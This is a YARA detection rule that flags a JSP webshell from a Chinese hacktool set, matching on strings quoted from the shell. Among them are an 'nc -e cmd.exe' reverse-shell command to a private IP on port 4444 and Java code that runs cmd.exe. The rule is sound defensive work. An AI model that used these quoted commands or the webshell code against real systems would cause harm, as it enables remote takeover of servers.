rule Webshell_Txt_jsp_RID2D92 : CHINA DEMO T1007 T1505_003 WEBSHELL {
   meta:
      description = "Chinese Hacktool Set - Webshells - file jsp.txt"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-14 10:37:31"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, T1007, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "program = \"cmd.exe /c net start > \" + SHELL_DIR" fullword ascii
      $s2 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
      $s3 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"" fullword ascii
      $s4 = "cmd = \"cmd.exe /c set\";" fullword ascii
   condition: 
      filesize < 715KB and 2 of them
}